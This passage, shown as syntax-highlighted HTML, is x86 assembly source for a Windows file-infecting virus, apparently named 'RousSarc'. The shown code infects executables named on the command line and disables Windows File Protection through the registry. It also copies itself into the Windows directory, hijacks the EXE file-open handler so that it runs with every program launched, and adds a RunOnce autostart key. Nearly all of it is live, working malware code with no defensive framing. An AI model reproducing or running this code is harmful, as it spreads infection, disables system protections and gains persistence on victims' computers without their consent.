 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">    </span><span class="sc1">; infect it</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CommandOK2</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; check if we don't get too far</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Outbreak</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CommandReceive2</span><span class="sc0">
</span><span class="sc5">CommandOK2</span><span class="sc4">:</span><span class="sc0">  
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ZeroAfterName</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZeroAfterName</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; we place a Zero here, so we can do a findfirst</span><span class="sc0">
                           </span><span class="sc1">; on the filename which is in esi</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileProc</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; esi points to start of filename</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; ebx points to the parameters</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; file is not there :( </span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Outbreak</span><span class="sc0">               </span><span class="sc1">; we infect some others</span><span class="sc0">


 </span><span class="sc6">pushad</span><span class="sc0">                    </span><span class="sc1">; save registers</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; lenght of filename in ecx</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                 </span><span class="sc1">; write filename &amp;amp; path there</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">   </span><span class="sc1">; point to filename</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">           </span><span class="sc1">; infect file</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">                     </span><span class="sc1">; restore registers</span><span class="sc0">

                           </span><span class="sc1">; esi points to start of filename</span><span class="sc0">
                           </span><span class="sc1">; ebx points to the parameters</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc0">   </span><span class="sc1">; place a blank here</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; let's execute the file</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessInformation</span><span class="sc0"> 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartupInfo</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpCurrentDirectory</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpEnvironment  </span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; Create_New_Process_Group &amp;amp; Normal_Priority_Class</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; bInheritHandles</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpProcessAttributes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">; filename with commandline</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; command line</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateProcessA</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">SetRunOnceKey</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; Here we go if we found an AV or got</span><span class="sc0">
                           </span><span class="sc1">; or after executing a program</span><span class="sc0">
                           </span><span class="sc1">; lets add 2 autostart features</span><span class="sc0">

                           </span><span class="sc1">; Now we store the name of this file in the RunOnce key</span><span class="sc0">
                           </span><span class="sc1">; ( we add our file that regulary, that it will be always there,</span><span class="sc0">
                           </span><span class="sc1">; but nearly noone looks for files in this key *g* )</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">            </span><span class="sc1">; complete access</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RunOnceKey</span><span class="sc0">    </span><span class="sc1">; check if our key exists</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">   </span><span class="sc1">; HKEY_LOCAL_MACHINE</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckOwnKey</span><span class="sc0"> 

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; search for end of Systemdirectory</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> 
 </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">    </span><span class="sc1">; Value</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">                   </span><span class="sc1">; String</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Valuename</span><span class="sc0">     </span><span class="sc1">; value name</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegSetValueExA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegCloseKey</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FirstGenHost</span><span class="sc0">

</span><span class="sc5">SaveBlanc</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">EXEFilesKey</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'exefile\shell\open\command'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXEFilesValue</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RousSarc.EXE "%1" %*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EFVSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXEFilesValue</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ------------------------------[ Outbreak ! ]-------------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc5">Outbreak</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; We got no commandline !</span><span class="sc0">
 </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">
 </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">
                           </span><span class="sc1">; first of all, let's disable the win2k virus protection</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">            </span><span class="sc1">; complete access</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_2kProt</span><span class="sc0">       </span><span class="sc1">; check if our key exists</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">   </span><span class="sc1">; HKEY_LOCAL_MACHINE</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; if we failed opening the key, we return</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">No2kProt</span><span class="sc0">

                           </span><span class="sc1">; Value to disable Windows File Protection</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ffffff9dh</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegBuffer</span><span class="sc0">     </span><span class="sc1">; Value</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">                   </span><span class="sc1">; REG_DWORD</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_2kProtValue</span><span class="sc0">  </span><span class="sc1">; value name</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegSetValueExA</span><span class="sc4">]</span><span class="sc0">

                           </span><span class="sc1">; Close it again</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegCloseKey</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">No2kProt</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Now we will copy ourselfes into the windows directory</span><span class="sc0">
                           </span><span class="sc1">; to be able to respond to every started file</span><span class="sc0">
                           </span><span class="sc1">; we just got the cmd line</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CmdLine</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CommandReceive3</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CommandOK3</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CommandReceive3</span><span class="sc0">


</span><span class="sc5">CommandOK3</span><span class="sc4">:</span><span class="sc0">  
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">               </span><span class="sc1">; eax points directly after the &amp;lt;name&amp;gt;.exe</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Place a 0 here to copy the file</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255d</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XGetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; search for end of Systemdirectory</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">
 </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RunOnceName</span><span class="sc0">      </span><span class="sc1">; Append Filename</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">
 </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
     
                    </span><span class="sc1">; Copy our file to the system directory</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">    </span><span class="sc1">; where to store</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CmdLine</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; existing</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCopyFileA</span><span class="sc4">]</span><span class="sc0">  

                           </span><span class="sc1">; Lets set the Exefiles Key</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">            </span><span class="sc1">; complete access</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXEFilesKey</span><span class="sc0">   </span><span class="sc1">; Open It</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">            </span><span class="sc1">; HKEY_CLASSES_ROOT</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckOwnKey</span><span class="sc0">

                           </span><span class="sc1">; Let's set our Value</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">EFVSize</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXEFilesValue</span><span class="sc0"> </span><span class="sc1">; Value</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">                   </span><span class="sc1">; String</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; value name</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegSetValueExA</span><span class="sc4">]</span><span class="sc0">
 

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegCloseKey</span><span class="sc4">]</span><span class="sc0">
 
 
</span><span class="sc5">CheckOwnKey</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">            </span><span class="sc1">; complete access</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyKey</span><span class="sc0">         </span><span class="sc1">; check if our key exists</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">    </span><span class="sc1">; HKEY_CURRENT_USER</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; if we failed opening the key, we return</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">KeySet</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; clear eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dispostiton</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; security attribs</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">            </span><span class="sc1">; complete access</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; REG_OPTION_NON_VOLATILE</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpClass</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; reserved</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyKey</span><span class="sc0">         </span><span class="sc1">; Subkey</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">    </span><span class="sc1">; HKEY_CURRENT_USER    </span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegCreateKeyExA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">KeySet</span><span class="sc4">:</span><span class="sc0">
 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegData2</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegBuffer</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegData1</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Valuename</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegQueryValueExA</span><span class="sc4">]</span><span class="sc0">
                           </span><span class="sc1">; RegBuffer contains now a value after which</span><span class="sc0">
                           </span><span class="sc1">; we decide what to do, but first, we increment the</span><span class="sc0">
                           </span><span class="sc1">; value and save it</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegBuffer</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increment Value</span><span class="sc0">

